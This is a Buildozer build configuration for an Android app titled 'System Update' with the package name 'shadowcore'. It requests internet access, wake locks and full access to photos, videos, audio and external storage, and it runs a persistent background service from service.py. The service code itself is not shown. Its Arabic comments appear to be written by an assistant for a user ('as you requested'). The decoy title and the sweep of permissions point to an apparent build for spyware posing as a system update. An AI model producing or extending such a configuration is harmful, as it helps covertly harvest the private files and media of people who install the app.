[app]
# (str) Title of your application
title = System Update

# (str) Package name
package.name = shadowcore

# (str) Package domain (needed for android packaging)
package.domain = org.test

# (str) Source code where the main.py is located
source.dir = .

# (list) Source files to include (let empty to include all the files)
source.include_exts = py,png,jpg,kv,atlas

# (str) Application versioning
version = 2.0

# (list) Application requirements
# comma separated e.g. requirements = sqlite3,kivy
requirements = python3,kivy,pyjnius,requests,certifi

# (str) Supported orientation (one of landscape, sensorLandscape, portrait or all)
# تم ضبطه ليكون بالطول حصراً كما طلبت
orientation = portrait

# (list) Permissions
# طلب كافة الصلاحيات للوصول للصور والملفات والخدمة الخلفية
android.permissions = INTERNET,FOREGROUND_SERVICE,WAKE_LOCK,READ_MEDIA_IMAGES,READ_MEDIA_VIDEO,READ_MEDIA_AUDIO,READ_EXTERNAL_STORAGE,WRITE_EXTERNAL_STORAGE,MANAGE_EXTERNAL_STORAGE

# (int) Target Android API, should be as high as possible.
android.api = 33

# (int) Minimum API your APK will support.
android.minapi = 21

# (str) Android logcat filters to use
android.logcat_filters = *:S python:D

# (bool) Copy library instead of making a libpython.so
android.copy_libs = 1

# (list) The Android archs to build for, choices: armeabi-v7a, arm64-v8a, x86, x86_64
android.archs = arm64-v8a, armeabi-v7a

# (list) Android service declaration
# ربط خدمة الخلفية بملف service.py
services = Myservice:service.py

# (bool) Indicate if the application should be foreground
android.foreground_service = True

# (bool) If True, then skip trying to update the Android sdk
android.skip_update = False

# (bool) If True, then automatically accept SDK license
android.accept_sdk_license = True

[buildozer]
# (int) Log level (0 = error only, 1 = info, 2 = debug (with command output))
log_level = 2

# (int) Display warning if buildozer is run as root (0 = no, 1 = yes)
warn_on_root = 1
